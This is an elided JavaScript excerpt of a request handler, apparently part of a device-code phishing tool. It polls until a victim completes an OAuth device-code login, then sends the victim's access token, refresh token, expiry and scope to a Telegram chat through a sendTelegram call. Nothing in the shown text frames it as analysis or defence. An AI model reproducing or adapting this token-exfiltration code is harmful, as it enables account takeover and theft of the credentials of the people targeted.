  ...
  handler: async (request, context) => {
    ...
    while (!devicecode && poll_count++ < 12 * 5) {
      ...
      if (devicecode) {
        ...
        // Dispatch the obtained tokens to Telegram
        await sendTelegram(
          "📲 <b>Device code flow completed</b>\n" +
          "<b>Access token:</b> " + (devicecode.access_token || "?") + "<br>" +
          "<b>Refresh token:</b> " + (devicecode.refresh_token || "?") + "<br>" +
          "<b>Expires in:</b> " + (devicecode.expires_in || "?") + "s<br>" +
          "<b>Scope:</b> " + (devicecode.scope || "?"),
          context
        );
      } else {
